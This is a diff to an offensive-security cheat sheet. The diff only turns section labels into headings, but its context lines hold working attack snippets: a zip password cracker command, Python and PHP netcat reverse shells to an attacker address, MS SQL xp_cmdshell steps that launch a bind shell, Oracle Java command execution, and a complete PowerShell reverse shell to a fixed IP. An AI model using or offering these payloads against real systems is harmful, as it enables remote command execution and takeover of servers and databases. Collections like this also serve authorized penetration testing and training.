@@ -12,7 +12,8 @@ fcrackzip -u -D -p <dictionary_file> <zip_file>
 ```
 
 # Code Execution
-Python 
+### Python 
+
 ```python 
 import subprocess
 subprocess.check_output(['whoami'])
@@ -25,11 +26,12 @@ import sys
 os.system('nc -e /bin/bash <attacker_ip> 8099')
 ```
 
-PHP
+### PHP
 ```php
 <?php passthru("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip_address> 8099 > /tmp/f"); ?>
 ```
-MS SQL
+
+### MS SQL
 ```sql
 EXEC SP_CONFIGURE N'show advanced options', 1
 go
@@ -41,7 +43,7 @@ xp_cmdshell 'cd C:\<path_to_bind_shell>\ & <bind_shell_name>.exe';
 go
 ```
 
-Oracle iSQL* Plus
+### Oracle iSQL* Plus
 ```sql
 exec dbms_java.grant_permission( 'SYSTEM','SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
 
@@ -61,7 +63,7 @@ end;
 exec javacmd('<command>');
 ```
 
-Power Shell
+### Power Shell
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101',8099);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
